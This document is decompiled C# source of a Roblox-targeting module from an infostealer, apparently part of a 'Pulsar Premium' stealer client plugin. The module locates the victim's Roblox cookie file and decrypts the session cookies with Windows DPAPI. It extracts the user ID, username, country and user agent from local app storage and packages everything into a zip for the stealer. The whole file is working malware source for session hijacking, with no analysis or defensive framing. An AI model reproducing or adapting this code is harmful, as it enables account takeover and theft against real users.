// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Games.Roblox
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using Intelix.Helper.Encrypted;
using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;

#nullable disable
namespace Intelix.Targets.Games;

public class Roblox : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    string path1 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), nameof (Roblox), "LocalStorage", "RobloxCookies.dat");
    if (!File.Exists(path1))
      return;
    Counter.CounterApplications counterApplications = new Counter.CounterApplications();
    counterApplications.Name = nameof (Roblox);
    Match match1 = Regex.Match(File.ReadAllText(path1), "\"CookiesData\"\\s*:\\s*\"(.*?)\"", RegexOptions.Singleline);
    if (!match1.Success)
      return;
    byte[] bytes = DpApi.Decrypt(Convert.FromBase64String(match1.Groups[1].Value));
    if (bytes == null)
      return;
    string entryPath1 = "Roblox\\cookies.txt";
    zip.AddTextFile(entryPath1, Encoding.UTF8.GetString(bytes).Replace("; ", "\n").Replace("#HttpOnly_.roblox.com", ".roblox.com"));
    counterApplications.Files.Add($"{path1} => {entryPath1}");
    string path2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), nameof (Roblox), "LocalStorage", "appStorage.json");
    if (!File.Exists(path2))
      return;
    List<string> values = new List<string>();
    string input = File.ReadAllText(path2);
    string pattern = "\"(PlayerExeLaunchTime|BrowserTrackerId|UserId|Username|DisplayName|CountryCode)\"\\s*:\\s*\"([^\"]*)\"";
    foreach (Match match2 in Regex.Matches(input, pattern))
    {
      string str1 = match2.Groups[1].Value;
      string str2 = match2.Groups[2].Value;
      if (!string.IsNullOrEmpty(str2))
        values.Add($"{str1}: {str2}\n");
    }
    Match match3 = Regex.Match(input, "\"WebViewUserAgent\"\\s*:\\s*\"([^\"]*)\"");
    if (match3.Success)
    {
      string entryPath2 = "Roblox\\useragent.txt";
      zip.AddTextFile(entryPath2, match3.Groups[1].Value);
      counterApplications.Files.Add($"{path2} => {entryPath2}");
    }
    if (values.Count > 0)
    {
      string entryPath3 = "Roblox\\information.txt";
      zip.AddTextFile(entryPath3, string.Concat((IEnumerable<string>) values));
      counterApplications.Files.Add($"{path2} => {entryPath3}");
    }
    if (counterApplications.Files.Count <= 0)
      return;
    counterApplications.Files.Add("Roblox\\");
    counter.Games.Add(counterApplications);
  }
}
